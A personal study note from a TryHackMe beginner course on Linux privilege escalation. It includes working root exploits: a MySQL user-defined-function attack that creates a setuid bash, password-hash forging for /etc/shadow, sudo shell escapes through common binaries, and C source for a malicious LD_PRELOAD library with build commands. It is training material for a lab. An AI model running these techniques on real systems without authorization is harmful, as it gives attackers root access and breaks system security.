# TryHackMe: Complete Beginner

## Linux PrivEsc

### Service Exploits

[Exploiting MySQL running as root via a malicious user-defined function dynamic library.](https://www.exploit-db.com/exploits/1518)

The key to this is that if MySQL is running as root, then it can write files to all manner of directories. We use this to load a malicious library (raptor_udf2.so from the above ExploitDB link) as a plugin by first dumping it as a blob into a table and then dumping it back out in MySQL’s plugin directory. Once there, we define a UDF using the malicious plugin to allow us to execute system commands; in particular, this lets us set the sticky bit on a copied shell that we can then execute to obtain root.

```bash
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
cat > rootme.sql <<EOF
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
EOF
mysql -u root mysql < rootme.sql
/tmp/rootbash -p # Root!
```

### Weak File Permissions

Make a new password hash for /etc/password or /etc/shadow:

```bash
mkpasswd -m sha-512 $PASSWORD
```

[It’s also possible to generate MD5 passwords for /etc/passwd using the openssl binary.](../notes/local-file-inclusion-attacks.md)

### Sudo

Some shell escapes via [GTFOBins](https://gtfobins.github.io):

* `awk` — `awk 'BEGIN {system("/bin/sh")}'`
* `find` — `find . -exec /bin/sh \; -quit`
* `ftp` — `!/bin/sh`
* `iftop` — `!/bin/sh`
* `less` — `!/bin/sh`
* `man` — `!/bin/sh`
* `more` — `!/bin/sh` (may require TERM to be unset)
* `nano` — ^R^X followed by `reset; sh 1>&0 2>&0`
* `nmap` — create a file containing `os.execute("/bin/sh")` and then run `nmap --script=$FILE`
* `vim` — `:set shell=/bin/sh` followed by `:shell`

If LD_PRELOAD or LD_LIBRARY_PATH are preserved by sudo, then it’s also possible to use a malicious dynamic library to gain root access. Preserved environment variables are listed by `sudo -l`.

LD_PRELOAD is probably the easiest of these to exploit, because a library listed in this environment variable is just automatically loaded on application start. So just run `sudo LD_PRELOAD=/path/to/malicious.so program-runnable-with-nopasswd`.

A simple malicious library (perhaps *the* simplest) that can exploit the LD_PRELOAD trick is:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Compile with:

```bash
gcc -fPIC -shared -nostartfiles -o /path/to/malicious.so /path/to/malicious.c
```

Using LD_LIBRARY_PATH is a bit trickier; use ldd to see what libraries a program is already pulling in, and then name your malicious library after one of these. Then run `sudo LD_LIBRARY_PATH=/path/to/malicious/library program-runnable-with-nopasswd` to trick the program into loading your malicious library instead of the legitimate system library.

While the same code as LD_PRELOAD can be used as a starting point for an LD_LIBRARY_PATH exploit, things get trickier because some libraries are required by others, loaded at different times, or have functions (symbols) that are loaded but not used right away. So some amount of trial-and-error, both in the naming of the malicious library and in what functions are defined within it, may be required.

NOTE that not every UNIX-like system calls their library path LD_LIBRARY_PATH!

- - - -

<span aria-hidden="true">👤</span> Nathan Acks  
<span aria-hidden="true">📅</span> October 30, 2021
